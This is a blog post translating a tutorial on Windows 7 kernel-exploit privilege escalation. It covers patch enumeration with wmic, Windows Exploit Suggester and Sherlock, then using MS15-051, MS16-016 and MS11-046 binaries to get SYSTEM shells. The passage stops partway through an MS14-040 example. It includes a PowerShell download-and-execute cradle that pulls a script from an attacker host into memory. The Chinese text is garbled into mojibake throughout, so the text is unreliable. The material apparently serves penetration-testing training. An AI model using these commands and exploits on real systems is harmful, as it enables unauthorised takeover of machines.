---
layout: post
title: 'Windows ææƒ-å†…æ ¸åˆ©ç”¨_1'
date: "2025-03-12T00:37:32Z"
---
Windows ææƒ-å†…æ ¸åˆ©ç”¨\_1
==================

> æœ¬æ–‡é€šè¿‡ Google ç¿»è¯‘ [Kernel Exploits Part 1 â€“ Windows Privilege Escalation](https://juggernaut-sec.com/kernel-exploits-part-1/) è¿™ç¯‡æ–‡ç« æ‰€äº§ç”Ÿï¼Œæœ¬äººä»…æ˜¯å¯¹æœºå™¨ç¿»è¯‘ä¸­éƒ¨åˆ†è¡¨è¾¾åˆ«æ‰­çš„å­—è¯è¿›è¡Œäº†æ ¡æ­£åŠä¸ªåˆ«æ³¨é‡Šè¡¥å……ã€‚

* * *

å¯¼èˆª
--

*   [0 å‰è¨€](#id0)
*   [1 æ—§ç‰ˆ Windows ç³»ç»Ÿå†…æ ¸åˆ©ç”¨](#id1)
*   [2 æœå¯»å†…æ ¸æ¼æ´](#id2)
    *   [2.1 æšä¸¾å†…æ ¸åˆ©ç”¨ - æ‰‹åŠ¨](#id2.1)
    *   [2.2 æšä¸¾å†…æ ¸åˆ©ç”¨ - è‡ªåŠ¨](#id2.2)
        *   [2.2.1 Windows Exploit Suggester 2](#id2.2.1)
        *   [2.2.2 Sherlock.ps1](#id2.2.2)
*   [3 ä½¿ç”¨å†…æ ¸åˆ©ç”¨](#id3)
    *   [3.1 ä½¿ç”¨å†…æ ¸åˆ©ç”¨ - GUI](#id3.1)
    *   [3.2 ä½¿ç”¨å†…æ ¸åˆ©ç”¨ - Reverse Shell](#id3.2)
*   [4 é€šè¿‡ Metasploit æŸ¥æ‰¾åŠä½¿ç”¨å†…æ ¸åˆ©ç”¨](#id4)

* * *

**

0ã€å‰è¨€

**
------------

> ç”±äº Windows å†…æ ¸åˆ©ç”¨çš„ä¿¡æ¯é‡æ¯”è¾ƒå¤§ï¼Œæ•…å°†æœ¬ç¯‡æ–‡ç« åˆ†æˆäº†ä¸¤ä¸ªéƒ¨åˆ†ã€‚

åœ¨ç¬¬ä¸€éƒ¨åˆ†å†…å®¹ä¸­ï¼Œæˆ‘ä»¬å°†ä»‹ç»å¦‚ä½•åœ¨æ—§ç‰ˆ Windows ç³»ç»Ÿä¸­è¿›è¡Œå†…æ ¸åˆ©ç”¨ã€‚

æˆ‘ä»¬ä»æ‰“äº†æœ€å°‘è¡¥ä¸çš„ Windows 7 æœºå™¨å¼€å§‹æµ‹è¯•ï¼Œç„¶åä½¿ç”¨å„ç§æ£€æµ‹å†…æ ¸åˆ©ç”¨çš„æ–¹æ³•å»æšä¸¾å®ƒå®¹æ˜“å—åˆ°å“ªäº›å†…æ ¸æ¼æ´çš„æ”»å‡»ã€‚åœ¨æ‰¾åˆ°æ½œåœ¨æ¼æ´åï¼Œæˆ‘ä»¬å°†æµ‹è¯•ç›¸åº”çš„æ¼æ´åˆ©ç”¨ï¼Œçœ‹çœ‹å®ƒä»¬æ˜¯å¦‚ä½•å·¥ä½œçš„ã€‚åœ¨æµ‹è¯•æ¼æ´åˆ©ç”¨æœŸé—´ï¼Œæˆ‘ä»¬å°†çœ‹åˆ° 6 ä¸ªæµ‹è¯•ç¤ºä¾‹ï¼Œå®ƒä»¬å±•ç¤ºäº†å¦‚ä½•ä» GUIã€ä»åå‘ shell å’Œä½¿ç”¨ Metasploit çš„æ–¹å¼å»æå‡æ™®é€šæƒé™åˆ° SYSTEMã€‚

> æ³¨ï¼šæ–‡ä¸­å‡ºç°äº†è¾ƒå¤šçš„â€œå†…æ ¸æ¼æ´â€å’Œâ€œå†…æ ¸åˆ©ç”¨â€ç­‰å­—çœ¼ï¼Œå› æ­¤æœ‰å¿…è¦ææ¸…äºŒè€…ä¹‹é—´çš„å…³ç³»ã€‚å…¶å®å†…æ ¸åˆ©ç”¨æ˜¯å†…æ ¸æ¼æ´çš„å®ä¾‹ï¼Œ**æ¼æ´**æ˜¯ä¸€ä¸ªæ¦‚å¿µï¼Œ**æ¼æ´åˆ©ç”¨**æ˜¯å®è·µã€‚

**

1ã€æ—§ç‰ˆ Windows ç³»ç»Ÿå†…æ ¸åˆ©ç”¨

**
---------------------------

Windows å†…æ ¸åˆ©ç”¨æŒ‰ç…§ OS ç‰ˆæœ¬åˆå¯ä»¥åˆ†ä¸ºä¸¤ä¸ªç±»ï¼šæ—§ç‰ˆ Windows ç³»ç»Ÿã€æ–°ç‰ˆ Windows ç³»ç»Ÿã€‚å…¶ä¸­ **Windows 10/Server 2016/Server 2019/ å…¶å®ƒæ›´æ–°ç‰ˆæœ¬** éƒ½ç§°ä¸ºæ–°ç‰ˆ Windows ç³»ç»Ÿï¼Œè€Œåœ¨æ­¤ä¹‹å‰çš„ **Windows XP/7/Server 2008/Server 2012/å…¶å®ƒæ›´æ—§ç‰ˆæœ¬** éƒ½ç§°ä¸ºæ—§ç‰ˆ Windows ç³»ç»Ÿã€‚

å¯¹äºæœ¬æ–‡ï¼Œæˆ‘ä»¬å°†ç ”ç©¶æ—§ç‰ˆ Windows ç³»ç»Ÿçš„å†…æ ¸åˆ©ç”¨ï¼Œæµ‹è¯•æœºå™¨æ˜¯ä»…å®‰è£…äº†ä¸€ä¸ªè¡¥ä¸çš„ Windows 7 SP1 7601ã€‚

**

2ã€æœå¯»å†…æ ¸æ¼æ´

**
----------------

åœ¨æ­¤ç¤ºä¾‹ä¸­ï¼Œå‡è®¾æˆ‘ä»¬å·²ç»åœ¨ Windows 7 æœºå™¨ä¸Šè·å¾—äº†æ ‡å‡†ç”¨æˆ· bob çš„èº«ä»½ã€‚

![](https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250311191841068-481334806.png)

#### **

2.1ã€æšä¸¾å†…æ ¸åˆ©ç”¨ - æ‰‹åŠ¨

**

åœ¨æšä¸¾å†…æ ¸æ¼æ´åˆ©ç”¨å‰ï¼Œæˆ‘ä»¬é¦–å…ˆè¦åšçš„æ˜¯ä½¿ç”¨ systeminfo å‘½ä»¤æŸ¥çœ‹ç³»ç»Ÿçš„ä¿¡æ¯ï¼Œå…¶ä¸­é‡ç‚¹å…³æ³¨ **æ“ä½œç³»ç»Ÿç‰ˆæœ¬ã€æ¶æ„ï¼Œä»¥åŠæœ€å…³é”® HotFixesï¼ˆKBï¼‰**è¿™äº›ä¿¡æ¯ã€‚

![](https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250311191843056-939508344.png)

ä»ä¸Šé¢å¯ä»¥çœ‹åˆ°ï¼Œè¯¥ä¸»æœºæ˜¯ Windows 7 Pro â€“ SP1 7601 â€“ x86 (32-bit) ç³»ç»Ÿï¼ŒåŒæ—¶è¯¥ä¸»æœºåªæœ‰ä¸€ä¸ªè¡¥ä¸ã€‚

ä¸ºäº†æ”¶é›†æœ‰å…³è¡¥ä¸çš„æ›´å¤šä¿¡æ¯ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹ wmic å‘½ä»¤ï¼š

    wmic qfe get Caption,Description,HotFixID,InstalledOn
    

![](https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250311191841249-1451999296.png)

ç”±äºå¾®è½¯ç»™æ¯ä¸ªå†…æ ¸æ¼æ´éƒ½èµ·äº†ä¸€ä¸ªåç§°ä½œä¸ºæ ‡è¯†ï¼Œè€Œåç§°ä¸­åˆåŒ…æ‹¬å‘ç°æ¼æ´çš„å¹´ä»½ï¼Œå› æ­¤**è¡¥ä¸çš„å‘å¸ƒæ—¥æœŸ**å¾ˆå€¼å¾—æ³¨æ„ã€‚ã€ä¾‹å¦‚ MS10-059ï¼ˆ2010ï¼‰è¡¨ç¤ºè¯¥æ¼æ´æ˜¯åœ¨ 2010 å¹´çš„ç¬¬ 59 ä¸ªå®‰å…¨å…¬å‘Šä¸­å‘å¸ƒçš„ï¼Œè€Œè¯¥å…¬å‘Šç¡®åˆ‡çš„å‘å¸ƒæ—¶é—´æ˜¯2010å¹´8æœˆ10æ—¥ã€‚ã€‘

> æ³¨æ„ï¼š**è¡¥ä¸çš„å‘å¸ƒæ—¥æœŸ**å’Œé€šè¿‡ wmic å‘ç°çš„**è¡¥ä¸å®‰è£…æ—¶é—´**å¯ä¸æ˜¯åŒä¸€å›äº‹ï¼Œä½œè€…çš„æ„æ€åº”è¯¥æ˜¯æ ¹æ®è¡¥ä¸ KB å·ç å»æŸ¥æ‰¾è¯¥è¡¥ä¸å®é™…çš„å‘å¸ƒæ—¶é—´ï¼Œç„¶åæ ¹æ®è¿™ä¸ªæ—¶é—´å»æ’é™¤è¿™ä¸ªæ—¥æœŸèŒƒå›´å†…çš„å†…æ ¸æ¼æ´åˆ©ç”¨ç¨‹åºã€å› ä¸ºè¡¥ä¸å’Œæ¼æ´çš„æŠ«éœ²é€šå¸¸æ¥è¯´æ˜¯å…ˆå‘è¡¥ä¸åå‘æ¼æ´æˆ–åŒæ—¶å‘å¸ƒï¼Œå½“ç„¶è¿™ä¹Ÿä¸ç»å¯¹ã€‚ã€‘ã€‚ä¾‹å¦‚ï¼Œè¡¥ä¸å¦‚æœæ˜¯2000å¹´å‘å¸ƒçš„ï¼Œé‚£ä¹ˆ2000å¹´ä¹‹åçš„ç³»ç»Ÿæ¼æ´å°±æ˜¯å¯ä»¥è¢«åˆ©ç”¨çš„ã€‚å½“ç„¶å¦‚æœè¡¥ä¸çš„å®‰è£…æ—¶é—´æ˜¯åœ¨2000å¹´ï¼Œé‚£ä¹ˆè¿™ä¸ªæ¼æ´è‚¯å®šæ˜¯åœ¨2000å¹´æˆ–2000å¹´ä¹‹å‰å‘å¸ƒçš„ï¼Œé‚£ä¹ˆä½¿ç”¨2000å¹´ä¹‹åçš„æ¼æ´å¤§æ¦‚ç‡ä¹Ÿæ˜¯æœ‰æ•ˆçš„ã€‚

ä»è¿™é‡Œï¼Œæˆ‘ä»¬å¯ä»¥å¼€å§‹åˆ†æç³»ç»Ÿå®‰è£…æœ‰å“ªäº›è¡¥ä¸ï¼Œç„¶åæœç´¢ KB å·ï¼Œä»¥ç¡®å®šç”±äºè¯¥è¡¥ä¸è€Œæ— æ³•ä½¿ç”¨çš„å†…æ ¸åˆ©ç”¨ã€‚

è¿™ç§æ‰‹åŠ¨æšä¸¾çš„æ–¹å¼å¯¹äºå®‰è£…äº†å°‘é‡çš„è¡¥ä¸æ¥è¯´ï¼Œæ•ˆæœå¾ˆå¥½ã€‚ä½†æ˜¯ï¼Œå¦‚æœå®‰è£…äº†å‡ ç™¾ä¸ªè¡¥ä¸ï¼Œ é‚£æ‰‹å·¥çš„æ–¹å¼æ˜¾ç„¶å°±ä¸å†é€‚åˆäº†ã€‚

#### **

2.2ã€æšä¸¾å†…æ ¸åˆ©ç”¨ - è‡ªåŠ¨

**

æœ‰ä¸¤ä¸ªå·¥å…·å¯ä»¥å¾ˆå¥½åœ°æšä¸¾æ—§ç‰ˆ Windows ç³»ç»Ÿçš„å†…æ ¸åˆ©ç”¨ï¼Œç¬¬ä¸€ä¸ªæ˜¯Windows Exploit Suggester 2ï¼Œç¬¬äºŒä¸ªæ˜¯ sherlock.ps1ã€‚

è¿™ä¸¤ç§å·¥å…·çš„å·¥ä½œåŸç†éƒ½æ˜¯å°†å—å®³è€…å·²å®‰è£…çš„è¡¥ä¸ä¸è¿™äº›è¡¥ä¸åº“ä¸­å·²æ‰“è¡¥ä¸çš„æ¼æ´åˆ—è¡¨è¿›è¡Œäº¤å‰å¼•ç”¨ã€‚ä»¥æ­¤ä¸ºåŸºç¡€ï¼Œè¿™äº›å·¥å…·å°†ä»è¾“å‡ºä¸­æ’é™¤å·²æ‰“è¡¥ä¸çš„æ¼æ´ï¼Œåªæä¾›ä¸»æœºæœªæ‰“è¡¥ä¸çš„æ¼æ´ã€‚

> åœ¨æµ‹è¯•å†…æ ¸åˆ©ç”¨æ—¶ï¼Œä½¿ç”¨è‡ªåŠ¨å·¥å…·æœ‰åŠ©äºæ¶ˆé™¤å¤§éƒ¨åˆ†çŒœæµ‹ã€‚ã€æ³¨ï¼šå½“ç„¶å·¥å…·ä¹Ÿä¼šå­˜åœ¨é—æ¼çš„æƒ…å†µã€‚ã€‘

###### **

2.2.1ã€Windows Exploit Suggester 2

**

ä½¿ç”¨çš„ç¬¬ä¸€ä¸ªå·¥å…·æ˜¯ [Windows Exploit Suggester 2](https://github.com/7Ragnarok7/Windows-Exploit-Suggester-2)ï¼Œå®ƒæ˜¯ä¸€ä¸ª Python è„šæœ¬ã€‚åœ¨æ”»å‡»è€…æœºå™¨ä¸Šä½¿ç”¨æ­¤è„šæœ¬å‰ï¼Œæˆ‘ä»¬éœ€è¦å…ˆè·å–å—å®³è€…æœºå™¨ä¸Šçš„ systeminfo ç³»ç»Ÿä¿¡æ¯ï¼Œä»¥åŠè¡¥ä¸åº“çš„æ–‡ä»¶ã€‚

![](https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250311191841777-294411196.png)

ç°åœ¨ï¼Œæˆ‘ä»¬å·²ç»å‡†å¤‡å¥½äº†å—å®³è€…çš„ç³»ç»Ÿä¿¡æ¯ txt æ–‡ä»¶ï¼Œè¿˜å¯ä»¥æ›´æ–°è¡¥ä¸åº“ XLS æ–‡ä»¶ï¼Œä»¥ç¡®ä¿è¡¥ä¸åˆ—è¡¨æ˜¯æœ€æ–°çš„ã€‚ä¸è¿‡ï¼Œç”±äºè¿™æ˜¯ä¸€ä¸ªåªå®‰è£…äº†ä¸€ä¸ªè¡¥ä¸çš„æ—§æ“ä½œç³»ç»Ÿï¼Œå› æ­¤ä¸éœ€è¦æ›´æ–°è¡¥ä¸åº“æ–‡ä»¶ï¼Œå› ä¸º 2021 å¹´ 4 æœˆå‰çš„è¡¥ä¸åº“å·²ç»è¶³å¤Ÿæ»¡è¶³å½“å‰çš„éœ€è¦äº†ã€‚

å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤è¿è¡Œ Windows Exploit Suggesterï¼š

    ./windows-exploit-suggester.py --database 2021-04-16-mssb.xls --systeminfo win7.txt
    

![](https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250311191843727-1929661561.png)

è¾“å‡ºå†…å®¹æœ‰å¾ˆå¤šï¼Œä½†å¤§éƒ¨åˆ†ä¿¡æ¯å¯¹æˆ‘ä»¬æ¥è¯´å¹¶æ²¡æœ‰ç”¨ã€‚åŒæ—¶ï¼Œè¯¥å·¥å…·è¿˜æä¾›äº†ä¸€ä¸ªæ ‡è¯†è¯´æ˜ï¼ˆE|M|\*ï¼‰ï¼Œä»¥å‘Šè¯‰æˆ‘ä»¬å¯¹åº”çš„ç³»ç»Ÿæ¼æ´æ˜¯å¦æœ‰äºŒè¿›åˆ¶æˆ– Metasploit æ¨¡å—å¯ä¾›ä½¿ç”¨ã€‚

äºæ˜¯ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ ¹æ®æä¾›çš„æ ‡è¯†è¿›è¡Œå†…å®¹è¿‡æ»¤ï¼Œè®©å…¶åªç­›é€‰å‡ºæˆ‘ä»¬æ„Ÿå…´è¶£çš„ä¿¡æ¯ï¼Œè¿™äº›ä¿¡æ¯é€šå¸¸åŒ…å«æœ‰ \[M\]æˆ–\[E\]æˆ–â€œElevation of privilegesâ€å­—æ®µã€‚

    ./windows-exploit-suggester.py --database 2021-04-16-mssb.xls --systeminfo win7.txt | grep "\[M\]\|\[E\]" | grep "Elevation"
    

![](https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250311191846663-245145433.png)

æœ€ç»ˆï¼Œæˆ‘ä»¬å¾—åˆ°äº†ä¸€ä¸ªå¯ä¾›æµ‹è¯•çš„æ¼æ´æ¸…å•ã€‚

###### **

2.2.2ã€Sherlock.ps1

**

[Sherlock](https://github.com/rasta-mouse/Sherlock) æ˜¯ä¸€ä¸ª PowerShell è„šæœ¬ï¼Œå¯å¿«é€Ÿæ‰¾åˆ°ç”¨äºæœ¬åœ°ç‰¹æƒæå‡çš„æ¼æ´åˆ©ç”¨ã€‚

Sherlockï¼ˆå¤æ´›å…‹ï¼‰å·²ç»è¢«å¼ƒç”¨å¤§çº¦ 5 å¹´äº†ï¼Œå¹¶ä¸”ä¹Ÿæ˜¯ä»é‚£æ—¶èµ·å°±è¢«Watson.exeï¼ˆåç”Ÿï¼‰æ‰€å–ä»£ï¼ŒWatson.exe æ˜¯ä¸€ä¸ªç”¨äºæšä¸¾æ–°ç‰ˆ Windows OS'ï¼ˆ10/2016/2019ï¼‰çš„å·¥å…·ï¼Œæˆ‘ä»¬å°†åœ¨è¿™ç¯‡æ–‡ç« çš„ç¬¬äºŒéƒ¨åˆ†ä¸­çœ‹åˆ°å®ƒã€‚

å›åˆ° Sherlockï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ Sherlock åœ¨æ—§ç‰ˆ Windows ç³»ç»Ÿä¸Šæšä¸¾å†…æ ¸æ¼æ´ã€‚è€Œå½“å‰æ­£å¤„åœ¨ Windows 7 æœºå™¨ä¸Šï¼Œå› æ­¤è¿™ä¸ªå·¥å…·å¯¹æˆ‘ä»¬æ¥è¯´éå¸¸é€‚åˆã€‚

ç°åœ¨ï¼Œåœ¨ Sherlock.ps1 è„šæœ¬åº•éƒ¨é™„åŠ ä»¥ä¸‹å‘½ä»¤ï¼Œä»¥ä¾¿è„šæœ¬çš„æšä¸¾æ¼æ´åŠŸèƒ½å¯ä»¥è¢«è‡ªåŠ¨æ‰§è¡Œï¼š

    echo "Find-AllVulns" >> Sherlock.ps1
    

![](https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250311191842533-468020167.png)

Perfectï¼ç°åœ¨ï¼Œæˆ‘ä»¬å¯ä»¥å°† sherlock.ps1 ä¸‹è½½åˆ°å—å®³è€…ç£ç›˜ä¸Šï¼Œç„¶åæ‰§è¡Œè¯¥è„šæœ¬ã€‚æˆ–è€…å¯ä»¥å¼€å¯ HTTP æœåŠ¡å™¨ï¼Œç„¶åå°†è„šæœ¬ç›´æ¥ä¸‹è½½åˆ°å†…å­˜ä¸­è¿›è¡Œæ‰§è¡Œã€‚

æˆ‘ä»¬ä½¿ç”¨åä¸€ç§ï¼Œå…ˆåœ¨æ”»å‡»æœºå¼€å¯ HTTP æœåŠ¡å™¨ï¼š

    python3 -m http.server 80
    

ç„¶ååœ¨å—å®³è€…æœºå™¨ä¸Šï¼Œæ‰§è¡Œä»¥ä¸‹ IEX å‘½ä»¤å°†è„šæœ¬ä»æ”»å‡»è€…è®¡ç®—æœºç›´æ¥ä¸‹è½½åˆ°å†…å­˜ä¸­æ‰§è¡Œï¼š

    powershell.exe -c "iex(new-object net.webclient).downloadstring('http://172.16.1.30/Sherlock.ps1')"
    

![](https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250311191843778-1637579289.png)

Sherlock ä¼šæ ¹æ®å·²å®‰è£…çš„è¡¥ä¸ç¨‹åºï¼Œæå–æ‰€æœ‰å¯èƒ½å­˜åœ¨çš„æ¼æ´ã€‚åŒæ—¶ï¼Œå®ƒè¿˜ä¼šè¿›ä¸€æ­¥å‘Šè¯‰ä½ ç³»ç»Ÿæ˜¯å¦å®¹æ˜“å—åˆ°è¯¥æ¼æ´çš„æ”»å‡»ã€‚

**

3ã€ä½¿ç”¨å†…æ ¸åˆ©ç”¨

**
----------------

ç°åœ¨ï¼Œæˆ‘ä»¬å·²ç»çŸ¥é“äº†è¯¥å¦‚ä½•æšä¸¾å†…æ ¸æ¼æ´åˆ©ç”¨ï¼Œæ¥ä¸‹æ¥å°±å¯ä»¥æ ¹æ®æšä¸¾å‡ºæ¥çš„æ¼æ´åˆ©ç”¨å»è¯¥[ä»“åº“](https://github.com/SecWiki/windows-kernel-exploits)æŸ¥æ‰¾å¯ç”¨çš„åˆ©ç”¨ç¨‹åºä»¥è¿›è¡Œæµ‹è¯•ã€‚

> åœ¨[å†…æ ¸åˆ©ç”¨åˆ—è¡¨](https://github.com/SecWiki/windows-kernel-exploits)ä¸­ï¼Œä½ ä¼šå‘ç°å¤§å¤šæ•°åˆ©ç”¨ç¨‹åºéƒ½ä¼šä»¥ SYSTEM çš„èº«ä»½ç”Ÿæˆä¸€ä¸ªæ–°çš„ cmd.exe å®ä¾‹ã€‚è™½ç„¶è¿™å¾ˆå¥½ï¼Œä½†åªæœ‰æˆ‘ä»¬åœ¨ GUI å›¾å½¢åŒ–ç•Œé¢æ¥æŸ¥çœ‹ shell çš„æƒ…å†µä¸‹æ‰å®ç”¨ã€‚ä½†å¹¸è¿çš„æ˜¯ï¼Œå¾ˆå¤šåˆ©ç”¨éƒ½æ”¯æŒâ€œå°±åœ°â€æå‡æˆ–äº§ç”Ÿåå‘ shellï¼Œå› æ­¤åœ¨å®é™…æµ‹è¯•è¿™äº›åˆ©ç”¨æ—¶ä¼šåŒæ—¶å±•ç¤ºè¿™ä¸¤ç§æƒ…å†µã€‚

ç°åœ¨ï¼Œè®©æˆ‘ä»¬é€šè¿‡å›¾å½¢åŒ–ç•Œé¢å’Œåå‘ shell æµ‹è¯•ä¸€äº›æ¼æ´ï¼Œçœ‹çœ‹ä¸¤è€…æœ‰ä»€ä¹ˆä¸åŒã€‚

#### **

3.1ã€ä½¿ç”¨å†…æ ¸åˆ©ç”¨ - GUI

**

å‡è®¾æˆ‘ä»¬åœ¨æœ€åˆçš„æšä¸¾ä¸­æ‰¾åˆ°äº†ç”¨æˆ· bob çš„å‡­æ®ï¼ŒåŒæ—¶å‘ç° RDP å¼€æ”¾ä¸”bob è¿˜æ˜¯è¿œç¨‹æ¡Œé¢ç”¨æˆ·ç»„çš„ä¸€éƒ¨åˆ†ã€‚ç„¶åï¼Œæˆ‘ä»¬æˆåŠŸåœ°é€šè¿‡ RDP è®¿é—®äº†è¯¥ä¸»æœºã€‚

ç”±äºåœ¨[å†…æ ¸åˆ©ç”¨åˆ—è¡¨](https://github.com/SecWiki/windows-kernel-exploits)ä¸Šçš„å¤§å¤šæ•°åˆ©ç”¨ç¨‹åºéƒ½ä¼šäº§ç”Ÿ cmd.exe çš„æ–°å®ä¾‹ï¼Œå› æ­¤å½“æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¸»æœºçš„å›¾å½¢åŒ–ç•Œé¢æ—¶ï¼Œå†…æ ¸åˆ©ç”¨ä¼šéå¸¸ç®€å•ã€‚

ã€**ç¤ºä¾‹0**ã€‘ä¾‹å¦‚ï¼Œä» Suggester å’Œ Sherlock çš„è¾“å‡ºæ¥çœ‹ï¼ŒåŒæ—¶åœ¨ä¸¤æ¬¾å·¥å…·ä¸­éƒ½å‡ºç°çš„æ¼æ´æœ‰ MS15-051 å’Œ MS16-016ã€‚

å› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨å†…æ ¸åˆ©ç”¨åˆ—è¡¨ä¸­ä¼˜å…ˆæ£€æŸ¥å®ƒä¿©æ˜¯å¦è¢«åˆ—å‡ºã€‚

![](https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250311191842755-1731370308.png)

å¯ä»¥çœ‹åˆ°ï¼Œä¸¤ä¸ªæ¼æ´éƒ½è¢«åˆ—å‡ºäº†ã€‚ç°åœ¨ï¼Œè®©æˆ‘ä»¬åªä¸‹è½½ MS15-051 ç„¶åå°†å…¶å‘é€ç»™å—å®³è€…ã€‚

> MS15-051 çš„é¢„ç¼–è¯‘äºŒè¿›åˆ¶æ–‡ä»¶è¢«ç§°ä¸º Taihou32.exeï¼Œä½†åœ¨å°†å…¶è½¬ç§»ç»™å—å®³è€…ä¹‹å‰ï¼Œæˆ‘å…ˆå°†å…¶é‡å‘½åä¸º MS15-051.exeã€‚

![](https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250311191843108-41629079.png)

ç°åœ¨ï¼Œå½“è¿è¡Œå¯æ‰§è¡Œæ–‡ä»¶æ—¶ï¼Œæ–°çš„ shell ä»¥ SYSTEM èº«ä»½äº§ç”Ÿäº†ï¼

![](https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250311191843030-671475720.png)

å°±è¿™ä¹ˆç®€å•ï¼

#### **

3.2ã€ä½¿ç”¨å†…æ ¸åˆ©ç”¨ - Reverse Shell

**

ä¸Šé¢æˆ‘ä»¬åªæ˜¯çœ‹åˆ°äº†å¦‚ä½•è½»æ¾åœ°ä» GUI è·å¾— SYSTEM shellï¼Œä½†é€šå¸¸æˆ‘ä»¬æ˜¯æ²¡æœ‰ GUI è®¿é—®æƒé™çš„ã€‚

å¹¸è¿çš„æ˜¯ï¼Œæœ‰ä¸å°‘æ¼æ´åˆ©ç”¨ç¨‹åºå¯ä»¥é€šè¿‡åå‘ shell è¿è¡Œï¼Œæˆ–â€œå°±åœ°â€æå‡è‡³ SYSTEMã€‚è¿™æ„å‘³ç€æ¼æ´åˆ©ç”¨è€…å¯ä»¥åœ¨å½“å‰ä¼šè¯ä¸­ç›´æ¥å‡çº§åˆ° SYSTEMï¼Œè€Œæ— éœ€å†ç”Ÿæˆç¬¬äºŒä¸ª cmd çª—å£ã€‚

ã€**ç¤ºä¾‹1**ã€‘é¦–å…ˆï¼Œè®©æˆ‘ä»¬æ£€æŸ¥ä¸€ä¸‹åœ¨ Sherlock å’Œ Suggester ä¸Šå‡ºç°çš„ç¬¬äºŒä¸ªæ¼æ´ï¼šMS16-016ã€‚

æˆ‘ä»¬å…ˆè·å–æ­¤åˆ©ç”¨ç¨‹åºï¼Œç„¶åå°†å…¶ä¼ è¾“åˆ°å—å®³è€…æœºå™¨ä¸Šã€‚

![](https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250311191843334-508996609.png)

> MS16-016 çš„é¢„ç¼–è¯‘äºŒè¿›åˆ¶æ–‡ä»¶è¢«ç§°ä¸º eop.exeï¼Œä½†åœ¨å°†å…¶è½¬ç§»ç»™å—å®³è€…ä¹‹å‰ï¼Œæˆ‘å…ˆå°†å…¶é‡å‘½åä¸º MS16-016.exeã€‚

éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒMS16-016 äºŒè¿›åˆ¶ç¨‹åºæ˜¯éœ€è¦ ShellCode.dll æ–‡ä»¶æ‰èƒ½å·¥ä½œã€‚å› æ­¤ï¼Œæˆ‘ä»¬è¦å°†ä¸¤ä¸ªæ–‡ä»¶è½¬ç§»åˆ°å—å®³è€…æœºå™¨ã€‚

![](https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250311191843304-982399890.png)

ç°åœ¨ï¼Œæˆ‘ä»¬å¯ä»¥æ‰§è¡Œ MS16-016.exeã€‚

![](https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250311191843294-726291128.png)

Amazingï¼åœ¨å½“å‰çš„ä¼šè¯ä¸­ï¼Œæˆ‘ä»¬å¾—åˆ°äº†ä¸€ä¸ª SYSTEM shellã€‚

ç”±äºæˆ‘ä»¬å¯¹è¿™ç§å†…æ ¸æ¼æ´åˆ©ç”¨ï¼ˆå³â€œå°±åœ°â€æå‡ï¼‰æœ€æ„Ÿå…´è¶£ï¼Œæ‰€ä»¥è®©æˆ‘ä»¬å†çœ‹çœ‹å¦å¤–ä¸¤ç§å†…æ ¸æ¼æ´åˆ©ç”¨ï¼Œå®ƒä»¬ä¹Ÿå¯ä»¥è¢«ç”¨æ¥åšåŒæ ·çš„äº‹æƒ…ã€‚

è¿™æ¬¡ï¼Œæˆ‘ä»¬å°†çœ‹åˆ°ä¸€ä¸ªåœ¨ Sherlock å’Œ Suggester æ‰«æä¸­å‡æœªå‡ºç°çš„æ¼æ´ï¼Œå®ƒå°±æ˜¯ï¼šMS11-046ã€‚

**æ—¢ç„¶è¯¥æ¼æ´æ²¡æœ‰åœ¨ä»»ä½•ä¸€ç§å·¥å…·çš„è¾“å‡ºä¸­å‡ºç°ï¼Œé‚£ä¸ºä»€ä¹ˆè¿˜è¦å»å°è¯•ä¸€ä¸‹å‘¢ï¼Ÿ**å› ä¸ºæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œå½“è¿è¡Œ wmic å‘½ä»¤æ—¶ï¼Œå·²å®‰è£…æ—¥æœŸæ˜¾ç¤ºçš„æ˜¯ 2010å¹´11æœˆï¼Œä¹Ÿå°±æ˜¯è¯´è¿™ä¸ªè¡¥ä¸åœ¨2010å¹´11æœˆå‰å°±å·²ç»å‘å¸ƒäº†ï¼Œè¿™ä¹Ÿæ„å‘³ç€ä»»ä½•ç­‰äºæˆ–å¤§äº MS11 çš„æ¼æ´åˆ©ç”¨éƒ½å€¼å¾—æˆ‘ä»¬å»å°è¯•ã€‚ã€æ³¨ï¼šæ ¹æ®è¡¥ä¸å®‰è£…æ—¥æœŸå»åˆ¤æ–­æ¼æ´çš„åšæ³•è™½ç„¶ä¸æ˜¯å¾ˆå‡†ç¡®ï¼Œä½†åœ¨æ— æœ‰æ•ˆè§£æ³•ä¹‹å‰ä¹Ÿæ˜¯å€¼å¾—å»å°è¯•çš„ã€‚ã€‘

ã€**ç¤ºä¾‹2**ã€‘å› æ­¤ï¼Œè®©æˆ‘ä»¬æµ‹è¯•å®ƒï¼

![](https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250311191843317-786070118.png)

![](https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250311191843184-1056164686.png)

BOOMï¼æˆ‘ä»¬å¾—åˆ°äº†å¦å¤–ä¸€ä¸ª SYSTEM shellã€‚

ã€**ç¤ºä¾‹3**ã€‘æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å¼€å§‹å¦ä¸€ä¸ªä¾‹å­ã€‚å¯ä»¥çœ‹åˆ°ï¼Œåœ¨ Suggester çš„è¾“å‡ºä¸­æ˜¾ç¤º MS14-040.exe å¯ä»¥è¢«ä½¿ç”¨ã€‚

![](https://img2024.cnblogs.com/blog/1503193/202503/1503193-20250311191843303-834111629.png)

